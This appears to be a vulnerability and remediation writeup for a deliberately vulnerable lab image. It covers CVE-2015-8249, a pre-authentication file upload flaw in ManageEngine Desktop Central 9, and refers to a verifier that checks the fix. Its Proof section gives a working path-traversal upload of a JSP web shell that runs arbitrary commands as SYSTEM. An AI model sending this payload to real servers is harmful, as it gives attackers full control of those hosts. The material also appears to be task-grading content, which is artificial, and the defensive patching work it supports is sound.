# ManageEngine Desktop Central 9 — FileUploadServlet Arbitrary File Upload (CVE-2015-8249)

## Severity
**Critical** (CVSS 9.8)

## CVE
- **CVE-2015-8249** — Pre-authentication arbitrary file upload in the `FileUploadServlet`
  endpoint of ManageEngine Desktop Central prior to build 91100, leading directly to
  RCE as the Desktop Central service account (`LocalSystem` by default).
- Publicly weaponized as Metasploit module
  `exploit/windows/http/manageengine_connectionid_write`.

## Description
Desktop Central's `/agent/connection/download/FileUploadServlet` accepted multipart
uploads with a `connectionId` parameter that was concatenated into a filesystem path
without canonicalization or authentication. An attacker supplies a `connectionId`
containing path-traversal segments and a `.jsp` body; the servlet writes the file to
a directory served by the bundled Tomcat and the JSP is executed on next request.

This image ships build **9.1.0_91097**, two builds behind the fix (91100), and
leaves the admin console on 8020/TCP plus the agent listener on 8040/TCP bound to
`0.0.0.0`.

## Affected Service
- **Service:** `ManageEngineDesktopCentral` (bundled Tomcat + PostgreSQL)
- **Ports:** 8020/TCP (admin UI), 8040/TCP (agent channel)
- **Vulnerable endpoint:** `POST /agent/connection/download/FileUploadServlet?connectionId=...`

## Proof
```
POST /agent/connection/download/FileUploadServlet?connectionId=../../../../webapps/DesktopCentral/shell.jsp HTTP/1.1
Host: <target>:8020
Content-Type: multipart/form-data; boundary=---X
Content-Length: ...

-----X
Content-Disposition: form-data; name="file"; filename="shell.jsp"
<%@ page import="java.util.*,java.io.*"%><% Runtime.getRuntime().exec(request.getParameter("c")); %>
-----X--
```
Then `GET /shell.jsp?c=whoami` runs as `NT AUTHORITY\SYSTEM`.

## Remediation Steps

No configuration change brings 9.1.0_91097 into a safe state; the fix is a build
upgrade. The verifier accepts any of the following.

1. **Upgrade to DC build ≥ 91100** (preferred — current supported line is Desktop
   Central build 10.1.2137.x+):
   ```powershell
   Stop-Service ManageEngineDesktopCentral
   & 'C:\ManageEngine\DesktopCentral_Server\bin\UpdateManager.bat' -c -f ppm_9.1.0_91100.ppm
   Start-Service ManageEngineDesktopCentral
   ```
2. **Decommission if unused:** stop and disable the service and remove the firewall
   rules — verifier accepts absence of the listener on 8020 **and** 8040.
3. **Compensating control (only if upgrade must be deferred):** front the admin and
   agent endpoints with a reverse proxy that rejects any request to
   `/agent/connection/download/FileUploadServlet` from unauthenticated sources. This
   is *not* accepted by the PoC check — it is listed for production guidance.
